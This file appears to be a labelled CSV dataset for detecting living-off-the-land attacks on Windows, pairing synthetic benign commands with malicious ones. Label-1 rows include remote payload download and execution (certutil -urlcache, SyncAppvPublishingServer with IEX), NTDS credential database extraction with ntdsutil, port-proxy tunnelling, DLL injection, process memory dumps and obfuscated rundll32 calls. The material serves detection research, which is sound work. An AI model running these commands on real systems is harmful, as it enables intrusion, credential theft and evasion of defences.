command,label,source,command_id
eventcreate.exe [/s <computer> [/u <domain\user> [/p <password>]] {[/l {APPLICATION|SYSTEM}]|[/so <srcname>]} /t {ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT} /id <eventID> /d <description>,0,volttyphoon,30
"del ""C:\AppData\Windows\uloysuj.txt"" /f /q",0,combined_lotl,31
"type.exe ""C:\AppData\rntdi.txt""",0,combined_lotl,32
extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE},1,combined_lotl,33
cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs,1,combined_lotl,34
net user fjhpurds /add,0,combined_lotl,35
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\Windows\nvefay.dll\"" \""D:\Logs\Logs\ferfufx.log\"""" /sc daily /st 23:00",0,combined_lotl,36
ping.exe 192.168.46.131,0,combined_lotl,37
net.exe use Z: \\192.168.128.68\data,0,combined_lotl,38
PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip},1,combined_lotl,39
"C:\Windows\System32\attrib.exe +h ""D:\Users\xfjgok\Pictures\Pictures\lvylac.sys""",0,combined_lotl,40
echo.exe G7dyNxjxy0aM > D:\Users\iwqi\Downloads\kellelehh.sys,0,combined_lotl,41
Sqlps.exe -noprofile,1,combined_lotl,42
detach vdisk [noerr],0,combined_lotl,43
C:\Windows\System32\ping.exe 192.168.183.57,0,combined_lotl,44
"teams.exe --disable-gpu-sandbox --gpu-launcher=""{CMD} &&""",1,combined_lotl,45
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,1,combined_lotl,46
"type.exe ""D:\Program Files\rhriafhupo.dat""",0,combined_lotl,47
C:\Windows\fsutil.exe devdrv trust [/f] D:\Logs,0,combined_lotl,48
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Users\apqkljvej.ini\"" \""D:\Program Files\Temp\rahuwrs.exe\"""" /sc daily /st 23:00",0,combined_lotl,49
wsl.exe -e /mnt/c/Windows/System32/calc.exe,1,combined_lotl,50
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Program Files\plpfkrhsk.dll\"" \""C:\AppData\Program Files\ikdptrrlq.sys\"""" /sc daily /st 23:00",0,combined_lotl,51
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,1,combined_lotl,52
certutil.exe -hashfile data.log SHA256,0,combined_lotl,53
C:\Windows\ping.exe 192.168.197.204,0,combined_lotl,54
"del ""C:\Windows\Program Files\afunlhooc.log"" /f /q",0,combined_lotl,55
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\uhwc\Downloads\Documents\ppefoehmx.dll\"" \""D:\Logs\Logs\zpnbfzuwxn.log\"""" /sc daily /st 23:00",0,combined_lotl,56
"dir.exe ""D:\AppData"" /s /b",0,combined_lotl,57
"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
C:\Windows\system32\pcwrun.exe
C:\Users\Administrator\Desktop\Win.exe
C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
""cmd.exe"" /c dir \\127.0.0.1\C$ /od
""cmd.exe"" /c ping –a –n 1 <IP address>
""cmd.exe"" /c wmic /user:<username> /password:<password> process call create ""net stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
net use \\127.0.0.1\IPC$ /y /d
powershell start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
wmic /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd /c whoami
xcopy C:\windows\temp\hp d:\{REDACTED}",1,combined_lotl,58
tar -xf {PATH}:ads,1,combined_lotl,59
vstest.console.exe {PATH:.dll},1,combined_lotl,60
"ssh -o ProxyCommand=""{C:\Windows\System32\cmd.exe}"" .",1,combined_lotl,61
"C:\Windows\findstr.exe /C:""LPFLMh8rNP13"" ""D:\Windows\jotmazlb.log""",0,combined_lotl,62
"copy ""C:\AppData\Program Files\jbufqx.sys"" ""D:\Windows\Temp\gdlwu.sys""",0,combined_lotl,63
net.exe use Z: \\192.168.152.57\public,0,combined_lotl,64
"certutil.exe -hashfile ""D:\Logs\kokgyppulc.sys"" SHA256",0,combined_lotl,65
"copy ""D:\Windows\phrzbxrxwg.exe"" ""C:\Logs\Temp\dskcc.log""",0,combined_lotl,66
"SyncAppvPublishingServer.vbs ""n;((New-Object net.exe.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",1,combined_lotl,67
"certutil.exe -hashfile ""C:\Windows\prhljpexkr.sys"" SHA256",0,combined_lotl,68
C:\Windows\fsutil.exe devdrv clearFiltersAllowed [[/f] C:\AppData],0,combined_lotl,69
procdump.exe -md {PATH:.dll} explorer.exe,1,combined_lotl,70
Msconfig.exe -5,1,combined_lotl,71
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},1,combined_lotl,72
"attrib +h ""D:\Logs\pnpfxqjnxl.txt""",0,combined_lotl,73
"certutil -hashfile ""C:\Users\moqman\Pictures\yzctg.exe"" SHA256",0,combined_lotl,74
net.exe localgroup Administrators mexwrfhj /add,0,combined_lotl,75
Runonce.exe /AlternateShellStartup,1,combined_lotl,76
"powershell -Command ""Get-ChildItem -Path D:\Users\mgpjcias\Desktop\Downloads -Recurse | Select-Object FullName, Length""",0,combined_lotl,77
"echo %DATE% %TIME% >> ""C:\Users\jbrnzp\Documents\fvcber.dll""",0,combined_lotl,78
echo HKJ1AZAUjlCs > D:\Temp\adcsmn.log,0,combined_lotl,79
"rmdir ""D:\Users\mgqengrg\Desktop\Documents"" /s /q",0,combined_lotl,80
"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""{PATH_ABSOLUTE:folder}"" 0 1",1,combined_lotl,81
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Users\fukjgg\Documents\szfhde.dll\"" \""C:\Logs\ispyddyos.log\"""" /sc daily /st 23:00",0,combined_lotl,82
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl},1,combined_lotl,83
C:\Program Files\systeminfo.exe,0,combined_lotl,84
"findstr.exe /C:""pDh41EuwAxSF"" ""C:\Program Files\Temp\lfnhd.ini""",0,combined_lotl,85
diskshadow/set/writer verify [writer> | <component>],0,combined_lotl,86
fsutil.exe devdrv query [C:\Logs],0,combined_lotl,87
"copy ""D:\AppData\unuuwye.exe"" ""D:\Logs\pbxfzxe.ini""",0,combined_lotl,88
"echo.exe %DATE% %TIME% >> ""D:\Windows\AppData\jhnvjt.sys""",0,combined_lotl,89
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\AppData\xuvlv.dll\"" \""C:\Logs\ouuruxhq.log\"""" /sc daily /st 23:00",0,combined_lotl,90
"echo %DATE% %TIME% >> ""D:\Users\gdqrpgjsf.ini""",0,combined_lotl,91
net.exe localgroup Administrators afmarhwe /add,0,combined_lotl,92
net use Z: \\192.168.84.85\backup,0,combined_lotl,93
"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Windows\adebirbe.sys\"" \""C:\Users\gwzwmibtxa.sys\"""" /sc daily /st 23:00",0,combined_lotl,94
expand [-r] <source> <destination>,0,combined_lotl,95
fc /b [E][C:\Logs]<filename1> [E][C:\Logs]<filename2>,0,combined_lotl,96
"attrib +h ""D:\Windows\yxoyzvrvgs.exe""",0,combined_lotl,97
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o,1,combined_lotl,98
esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o,1,combined_lotl,99
ilasm.exe {PATH_ABSOLUTE:.txt} /dll,1,combined_lotl,100
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},1,combined_lotl,101
"rmdir.exe ""D:\Users\kulz\Downloads\Downloads"" /s /q",0,combined_lotl,102
"echo %DATE% %TIME% >> ""C:\Program Files\dhdvak.exe""",0,combined_lotl,103
net.exe user vrjqdrvb /add,0,combined_lotl,104
"mkdir.exe ""C:\Users\AppData""",0,combined_lotl,105
"msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",1,combined_lotl,106
"C:\Windows\System32\findstr.exe /C:""fN6JaGjGFkae"" ""D:\Logs\ucgpmaxb.sys""",0,combined_lotl,107
"echo %DATE% %TIME% >> ""D:\Users\bskaleea\Desktop\Desktop\hxsoq.ini""",0,combined_lotl,108
"fsutil file layout ""D:\Users\jqxe\Pictures\Downloads\jscmkmvuis.ini""",0,combined_lotl,109
net.exe localgroup Administrators ivlitoyx /add,0,combined_lotl,110
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt},1,combined_lotl,111
"move.exe ""D:\Logs\Users\mpvnprvdsg.log"" ""C:\Temp\Logs\afvxaazos.log""",0,combined_lotl,112
"echo %DATE% %TIME% >> ""C:\AppData\Windows\xkunmnhi.dll""",0,combined_lotl,113
echo.exe oC00O3JknI1N > D:\Users\ltuixkx\Downloads\Documents\mointo.log,0,combined_lotl,114
Presentationhost.exe {PATH_ABSOLUTE:.xbap},1,combined_lotl,115
coregen.exe dummy_assembly_name,1,combined_lotl,116
"C:\Windows\icacls.exe ""D:\Users\Temp\qqwlgy.dll"" /grant Everyone:F",0,combined_lotl,117
net.exe use Z: \\192.168.43.104\public,0,combined_lotl,118
"rmdir.exe ""C:\Users\btjk\Downloads"" /s /q",0,combined_lotl,119
"fsutil.exe file layout ""C:\Windows\mubwjx.dll""",0,combined_lotl,120
rem  This batch program formats and checks new disks.,0,combined_lotl,121
C:\Windows\System32\netsh.exe advfirewall show allprofiles,0,combined_lotl,122
"Get-EventLog security -instanceid 4624 | Where-
Object {$_.message.contains('{redacted user
account}')} | select -First 1 | fl ",1,combined_lotl,123
attrib.exe +r config.ini,0,combined_lotl,124
"echo %DATE% %TIME% >> ""D:\Users\AppData\obiabrev.dll""",0,combined_lotl,125
cmdkey /list,1,combined_lotl,126
appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml},1,combined_lotl,127
"rmdir.exe ""D:\Users\zxgd\Documents"" /s /q",0,combined_lotl,128
"powershell.exe -ep bypass -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()""",1,combined_lotl,129
"copy ""C:\Temp\Temp\gizdkygigs.dat"" ""C:\Users\Logs\kfqegxx.exe""",0,combined_lotl,130
net.exe localgroup Administrators jphxjhur /add,0,combined_lotl,131
"rundll32.exe {PATH},EntryPoint",1,combined_lotl,132
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},1,combined_lotl,133
ping.exe 192.168.33.53,0,combined_lotl,134
"C:\Windows\System32\echo.exe %DATE% %TIME% >> ""D:\Windows\iovnftku.log""",0,combined_lotl,135
ping.exe 192.168.207.233,0,combined_lotl,136
"for /r ""C:\My C:\Windows\dir.exe\"" %A in (*.*) do echo %~ftzA",0,combined_lotl,137
D:\Windows\type.exe {PATH_SMB} > {PATH_ABSOLUTE},1,combined_lotl,138
rundll32.exe -sta {CLSID},1,combined_lotl,139
Gpscript /logon,1,combined_lotl,140
"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",1,combined_lotl,141
"copy ""D:\AppData\AppData\fhnixawvq.log"" ""D:\Users\hmdcwxro\Desktop\Pictures\asrqfrcbn.txt""",0,combined_lotl,142
convert gpt [noerr],0,combined_lotl,143
echo.exe 3v2PTVu9T8xi > C:\Program Files\zdakxbd.sys,0,combined_lotl,144
OfflineScannerShell,1,combined_lotl,145
"C:\Windows\powershell.exe -Command ""Get-Service""",0,combined_lotl,146
"dissociate targets <n> [,<n> [,…]]",0,combined_lotl,147
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",1,combined_lotl,148
"certutil.exe -hashfile ""D:\AppData\nscam.dll"" SHA256",0,combined_lotl,149
"findstr /C:""EeB6tybC6SSA"" ""C:\Users\Temp\qxlju.log""",0,combined_lotl,150
net user fvnywyoy /add,0,combined_lotl,151
"del ""D:\Temp\wetvfwg.exe"" /f /q",0,combined_lotl,152
"ntdsutil.exe snapshot “ac i ntds”
create quit quit",1,volttyphoon,153
net.exe user kxjgtkap /add,0,combined_lotl,154
"Pester.bat [/help|?|-?|/?] ""$null; {cmd.exe}""",1,combined_lotl,155
net.exe use Z: \\192.168.143.244\data,0,combined_lotl,156
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,1,combined_lotl,157
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""",1,combined_lotl,158
echo uE1BoJQV6Z1Q > C:\Windows\mgjjkmektv.log,0,combined_lotl,159
"copy.exe ""C:\Logs\cievqlbb.sys"" ""D:\AppData\vowxlm.log""",0,combined_lotl,160
net localgroup Administrators njgsiebq /add,0,combined_lotl,161
echo.exe NbcwXf7ZwwV1 > D:\Program Files\Temp\voamrod.dll,0,combined_lotl,162
"move ""C:\Program Files\fxokmohjd.exe"" ""D:\Users\zzvgg.dat""",0,combined_lotl,163
"mkdir ""D:\Windows\Users""",0,combined_lotl,164
"type.exe ""C:\AppData\Logs\lhoic.dll""",0,combined_lotl,165
ieexec.exe {REMOTEURL:.exe},1,combined_lotl,166
"del ""C:\Users\wetdkqfvb.txt"" /f /q",0,combined_lotl,167
"C:\Windows\powershell.exe -Command ""Get-Process""",0,combined_lotl,168
"findstr /C:""vFrvVNfliEpC"" ""D:\Windows\Users\waxbfrecn.dat""",0,combined_lotl,169
"rmdir ""D:\Users\Windows"" /s /q",0,combined_lotl,170
"rmdir.exe ""D:\Program Files\Temp"" /s /q",0,combined_lotl,171
automount disable,0,combined_lotl,172
Remote.exe /s {PATH_SMB:.exe} anythinghere,1,combined_lotl,173
"findstr /C:""xbEY9lT0RhAI"" ""D:\Temp\agjya.ini""",0,combined_lotl,174
"powershell.exe -Command ""Get-ChildItem -Path D:\Program Files\Logs -Recurse | Select-Object FullName, Length""",0,combined_lotl,175
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\cskl\Documents\Documents\zzakqyk.exe\"" \""D:\Windows\AppData\njvthsn.log\"""" /sc daily /st 23:00",0,combined_lotl,176
InstallUtil.exe {REMOTEURL},1,combined_lotl,177
"msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=""{CMD}""",1,combined_lotl,178
net.exe use Z: \\192.168.210.227\backup,0,combined_lotl,179
net.exe use Z: \\192.168.133.18\backup,0,combined_lotl,180
MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},1,combined_lotl,181
"copy.exe ""C:\Logs\gizstyww.sys"" ""D:\Temp\fnmcfs.log""",0,combined_lotl,182
echo.exe NaJwizWIMPQs > C:\Windows\AppData\jmoao.dll,0,combined_lotl,183
echo.exe IK2q1eRZ7W8u > D:\Users\qevnoloc\Downloads\Desktop\xcowgavw.sys,0,combined_lotl,184
"dir ""D:\AppData""",0,combined_lotl,185
flattemp {/query | /enable | /disable},0,combined_lotl,186
"type.exe ""D:\Users\tuaoqc\Downloads\qejiuzdfpr.txt""",0,combined_lotl,187
"copy ""D:\Temp\Temp\lqqjicju.exe"" ""C:\Users\AppData\nitychlyw.dat""",0,combined_lotl,188
echo 7kj1wFvDwSwH > C:\AppData\raoadfb.dat,0,combined_lotl,189
"cmd.exe"" /c wmic.exe process call create ""cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs & ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\McAfee_Logs\",1,volttyphoon,190
"type.exe ""D:\Program Files\Temp\jnfqflcb.ini""",0,combined_lotl,191
"certutil.exe -hashfile ""D:\Windows\iqpbvmfl.dat"" SHA256",0,combined_lotl,192
"cmd.exe /c ""netsh.exe interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress= connectport=8443 protocol=tcp""",1,volttyphoon,193
automagic {set | clear | apply} all <flag=value> [<flag=value> [...]],0,combined_lotl,194
"echo %DATE% %TIME% >> ""C:\Program Files\Windows\vxfcecbtrg.sys""",0,combined_lotl,195
"powershell -Command ""Get-ChildItem -Path C:\Users\fmkp\Downloads\Documents -Recurse | Select-Object FullName, Length""",0,combined_lotl,196
"mkdir.exe ""D:\Program Files\Temp""",0,combined_lotl,197
"Get-EventLog security -instanceid 4624 | Where-
Object {$_.message.contains('{redacted user
account}')} | select -First 1 | fl",1,volttyphoon,198
"eventcreate /s server /u user /p password /id 100 /t ERROR /l application /d ""Remote machine with user credentials""",0,combined_lotl,199
ping.exe 192.168.108.157,0,combined_lotl,200
"xbootmgr.exe -trace ""{boot|hibernate|standby|shutdown|rebootCycle}"" -preTraceCmd {PATH:.exe}",1,combined_lotl,201
"fsutil file layout ""C:\AppData\Program Files\dvokkystwx.sys""",0,combined_lotl,202
C:\Windows\fsutil.exe volume querycluster C: 50 0x2000,0,combined_lotl,203
wfc.exe {PATH_ABSOLUTE:.xoml},1,combined_lotl,204
"del ""D:\Temp\cssaywwsko.sys"" /f /q",0,combined_lotl,205
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\copy.exe \""D:\Program Files\xtfvtfmwmv.txt\"" \""C:\Users\taxpscq.ini\"""" /sc daily /st 23:00",0,combined_lotl,206
net.exe use Z: \\192.168.156.140\backup,0,combined_lotl,207
"certutil.exe -hashfile ""D:\Windows\Temp\ydyovtckbg.dll"" SHA256",0,combined_lotl,208
"attrib.exe +h ""C:\Users\sjgmfurah.ini""",0,combined_lotl,209
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,1,combined_lotl,210
echo TjoG4qkJ7f7E > C:\Logs\Logs\zlfcstbh.ini,0,combined_lotl,211
ping 192.168.188.166,0,combined_lotl,212
extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe,1,combined_lotl,213
extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe},1,combined_lotl,214
sqldumper.exe 540 0 0x01100:40,1,combined_lotl,215
ComputerDefaults.exe,1,combined_lotl,216
"rmdir.exe ""D:\Users\tccnhfug\Documents\Desktop"" /s /q",0,combined_lotl,217
"copy ""D:\Temp\kaaymu.txt"" ""C:\AppData\Windows\vgynpe.dat""",0,combined_lotl,218
"C:\Windows\System32\copy.exe ""C:\Program Files\peuxjzwo.dat"" ""C:\Windows\Windows\ydohqi.txt""",0,combined_lotl,219
"echo %DATE% %TIME% >> ""D:\Users\AppData\uojnpjtv.exe""",0,combined_lotl,220
ping.exe 192.168.116.250,0,combined_lotl,221
"copy ""D:\Temp\Program Files\rlhxr.dat"" ""D:\Windows\Program Files\asgjzbe.dat""",0,combined_lotl,222
C:\Windows\echo.exe J269K4ZAYdBj > D:\Program Files\AppData\pwwvndtcc.dll,0,combined_lotl,223
regini.exe {PATH}:hidden.ini,1,combined_lotl,224
"cdb.exe -c {PATH:.txt} ""{CMD}""",1,combined_lotl,225
OpenConsole.exe {PATH:.exe},1,combined_lotl,226
"D:\Windows\certutil.exe -hashfile ""C:\Users\Logs\tillrj.ini"" SHA256",0,combined_lotl,227
"certutil -hashfile ""C:\Users\Program Files\dmqpqxup.log"" SHA256",0,combined_lotl,228
Extexport.exe {PATH_ABSOLUTE:folder} foo bar,1,combined_lotl,229
"findstr.exe /C:""roDjjy8dglLB"" ""C:\Program Files\AppData\kprohlbm.log""",0,combined_lotl,230
echo.exe nkjhsAAYD6xa > C:\AppData\jopmfmsoqd.dat,0,combined_lotl,231
ping.exe 192.168.85.250,0,combined_lotl,232
"7z.exe a -p {REDACTED} c:\windows\temp\{REDACTED}.7z
C:\Windows\system32\pcwrun.exe
C:\Users\Administrator\Desktop\Win.exe
C:\Windows\System32\cmdbak.exe /c ping -n 1 127.0.0.1 > C:\Windows\temp\putty.log C:\Windows\Temp\tmp.log
""cmd.exe"" /c dir.exe \\127.0.0.1\C$ /od
""cmd.exe"" /c ping –a –n 1 <IP address>
""cmd.exe"" /c wmic.exe /user:<username> /password:<password> process call create ""net.exe stop \""<service name>\"" > C:\Windows\Temp\tmp.log""
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__<timestamp value> 2>&1
net.exe use \\127.0.0.1\IPC$ /y /d
powershell.exe start-process -filepath c:\windows\temp\<filename>.bat -windowstyle Hidden
rar.exe a –{REDACTED} c:\Windows\temp\{REDACTED} D:\{REDACTED}\
wmic.exe /node:{REDACTED} /user:{REDACTED} /password:{REDACTED} cmd.exe /c whoami.exe
xcopy.exe C:\windows\temp\hp d:\{REDACTED}",1,volttyphoon,233
AppVLP.exe {PATH_SMB:.bat},1,combined_lotl,234
"E:\Windows\System32\attrib.exe +h ""D:\Program Files\Temp\cqyrpdp.dll""",0,combined_lotl,235
"copy ""D:\Program Files\Windows\hfjba.dll"" ""C:\Users\iqzojex.log""",0,combined_lotl,236
add volume <volume> [provider dbe96af8-5b14-450b-9d3b-fdfb1b5730dd],0,combined_lotl,237
"copy.exe ""D:\Users\ukvqz\Pictures\bygkt.ini"" ""C:\Windows\ycojdsuk.log""",0,combined_lotl,238
"type ""C:\Users\floaoihr\Downloads\Documents\mryzug.ini""",0,combined_lotl,239
"C:\Windows\System32\type.exe ""D:\Program Files\mgnwuuw.dll""",0,combined_lotl,240
"move ""C:\Users\mgvfv\Documents\xlzxvoxi.txt"" ""D:\Users\Windows\njvkh.exe""",0,combined_lotl,241
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Users\kkhujmcijp.ini\"" \""C:\Temp\AppData\dvbzi.dat\"""" /sc daily /st 23:00",0,combined_lotl,242
net.exe user toysmrja /add,0,combined_lotl,243
add tpgroup tportal=n [noerr],0,combined_lotl,244
"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\sghgxr.sys\"" \""C:\Logs\fesjcw.dll\"""" /sc daily /st 23:00",0,combined_lotl,245
vbc.exe /target:exe {PATH_ABSOLUTE:.vb},1,combined_lotl,246
"del ""D:\AppData\ebxxwrk.log"" /f /q",0,combined_lotl,247
"icacls ""C:\Windows\Program Files\dawaoszbc.log"" /grant Everyone:F",0,combined_lotl,248
"D:\Windows\System32\findstr.exe /C:""slDdm10dyAn8"" ""C:\Users\ybwyy\Downloads\Documents\tahupowjs.sys""",0,combined_lotl,249
HH.exe {REMOTEURL:.bat},1,combined_lotl,250
echo sOC0hNsctJvG > D:\Windows\jhdrpmyql.sys,0,combined_lotl,251
"mkdir.exe ""D:\Users\dgzwibp\Desktop\Pictures""",0,combined_lotl,252
"type ""C:\Users\lzezy\Pictures\adlmciiea.ini""",0,combined_lotl,253
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt,1,combined_lotl,254
"type ""D:\Program Files\hbscp.log""",0,combined_lotl,255
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},1,combined_lotl,256
"rundll32 ieadvpack.dll, RegisterOCX {cmd.exe}",1,combined_lotl,257
"sftp -o ProxyCommand=""{C:\Windows\System32\cmd.exe}"" .",1,combined_lotl,258
pktmon.exe filter add -p 445,1,combined_lotl,259
"type ""C:\Users\efjpz.exe""",0,combined_lotl,260
"schtasks /create /tn ""My Daily Backup"" /tr ""C:\Windows\System32\copy.exe \""D:\Program Files\Logs\khqujaapl.log\"" \""C:\Windows\Program Files\hmjmvt.dll\"""" /sc daily /st 23:00",0,combined_lotl,261
"D:\Windows\icacls.exe ""C:\Windows\bueor.txt"" /grant Everyone:F",0,combined_lotl,262
C:\Windows\System32\net.exe use Z: \\192.168.218.178\data,0,combined_lotl,263
csc.exe -out:{PATH:.exe} {PATH:.cs},1,combined_lotl,264
echo 7vF7asC1ZkYH > C:\Logs\Temp\aemrsry.exe,0,combined_lotl,265
msiexec /y {PATH_ABSOLUTE:.dll},1,combined_lotl,266
teams.exe,1,combined_lotl,267
"move ""C:\Temp\grgiqcyh.log"" ""D:\Users\snbngwamp.exe""",0,combined_lotl,268
"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",1,combined_lotl,269
"type.exe ""D:\Program Files\AppData\ymfbhycq.dll""",0,combined_lotl,270
"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",1,combined_lotl,271
regsvr32.exe /s {PATH:.dll},1,combined_lotl,272
